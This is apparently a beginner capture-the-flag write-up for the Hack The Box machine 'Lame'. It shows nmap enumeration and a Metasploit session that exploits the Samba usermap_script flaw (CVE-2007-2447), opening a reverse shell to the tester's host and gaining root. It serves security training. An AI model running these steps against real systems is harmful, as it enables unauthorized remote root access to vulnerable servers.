---
title: "Hack The Box - Lame - Writeup"
description: "Linux service enumeration and exploitation of vulnerable Samba services on Hack The Box Lame."

platform: "Hack The Box"
images:
  - "/images/lame.png"
difficulty: "Easy"
draft: false

tags:
  - HackTheBox
  - Linux
  - Samba
  - vsftpd
  - Metasploit
  - CVE-2007-2447
  - CVE-2011-2523
  - Remote Code Execution

categories:
  - HTB

ShowToc: true
TocOpen: true
ShowReadingTime: false
ShowBreadCrumbs: false
---

{{< section >}}

# Overview

Lame is a beginner-friendly Linux machine focused on service enumeration and exploiting publicly known vulnerabilities in outdated software versions.

The machine demonstrates how vulnerable Samba services can lead directly to remote root compromise.

{{< /section >}}

---

{{< section >}}

# Attack Path Summary

```text
Reconnaissance
        ↓
Vulnerability Identification
        ↓
Initial Foothold
        ↓
Remote Code Execution
        ↓
Root Access
```

{{< /section >}}

---

# Reconnaissance

## Nmap Scan

Initial service enumeration:

```bash
nmap -sVC -Pn 10.129.37.195
```

```text
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.62
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)

22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)

139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

The first thing that attracted my attention was the FTP version.

`vsftpd 2.3.4` is a well-known vulnerable version associated with `CVE-2011-2523`.

---

## Service Enumeration
{{< note >}}

Anonymous FTP access was enabled on the target system.

The SMB service was also publicly exposed and revealed an outdated Samba version.

{{</ note >}}
---

## Vulnerability Identification
{{< note >}}
During enumeration, two publicly known vulnerabilities were identified:

- `CVE-2011-2523` affecting `vsftpd 2.3.4`
- `CVE-2007-2447` affecting `Samba smbd 3.0.20`
{{</ note >}}
---

# Initial Foothold

## CVE-2011-2523 Analysis

{{< note >}}

> `CVE-2011-2523` is a critical vulnerability affecting `vsftpd 2.3.4`.
>
> The vulnerability contains a malicious backdoor that opens a shell on port `6200/tcp`, allowing unauthorized remote access to the target system.

{{< /note >}}

However, port `6200` was closed on the target machine, meaning this exploit path was not viable.

Further enumeration showed that the Samba service was also vulnerable to `CVE-2007-2447`.

---

## CVE-2007-2447 Analysis

{{< note >}}

> `CVE-2007-2447` is a command injection vulnerability affecting vulnerable Samba versions.

{{< /note >}}

The vulnerability allows attackers to execute arbitrary commands remotely through the vulnerable Samba service.

---

## Samba Exploitation

The vulnerability was exploited using the Metasploit module:

```bash
multi/samba/usermap_script
```

Exploit execution:

```bash
msfconsole

use multi/samba/usermap_script

set RHOSTS 10.129.37.195
set LHOST 10.10.14.62

run
```

```text
[*] Started reverse TCP handler on 10.10.14.62:4444

[*] Command shell session 2 opened
(10.10.14.62:4444 -> 10.129.37.195:52579)
at 2026-05-17 19:01:09 +0500

id

uid=0(root) gid=0(root)
```

The exploit successfully provided remote command execution as the root user.

---

# Privilege Escalation

## Root Access

Privilege escalation was not required because the Samba exploit directly executed commands with root privileges.

---

{{< section >}}

# Skills & Concepts

* Service Enumeration
* Vulnerability Identification
* Samba Exploitation
* Metasploit Usage
* Remote Code Execution

{{< /section >}}

---

{{< section >}}

# Tools Used

* Nmap
* Metasploit

{{< /section >}}

---

# Lessons Learned

Lame is an excellent beginner machine because it introduces the importance of:

- Proper service enumeration
- Identifying vulnerable software versions
- Researching public CVEs
- Exploiting Samba vulnerabilities
- Using Metasploit effectively

The machine also highlights the risks of running outdated and vulnerable services in production environments.

---